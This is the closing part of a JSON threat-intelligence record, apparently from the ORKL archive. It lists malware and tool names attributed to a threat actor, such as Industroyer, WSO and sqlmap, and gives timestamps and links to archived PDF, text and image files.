                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535962,
    "ts_updated_at": 1743041499,
    "ts_creation_date": 1651827071,
    "ts_modification_date": 1651827071,
    "files": {
        "pdf": "https://archive.orkl.eu/12ea9806606614e97dd428dd2cdea032b3255462.pdf",
        "text": "https://archive.orkl.eu/12ea9806606614e97dd428dd2cdea032b3255462.txt",
        "img": "https://archive.orkl.eu/12ea9806606614e97dd428dd2cdea032b3255462.jpg"
    }
}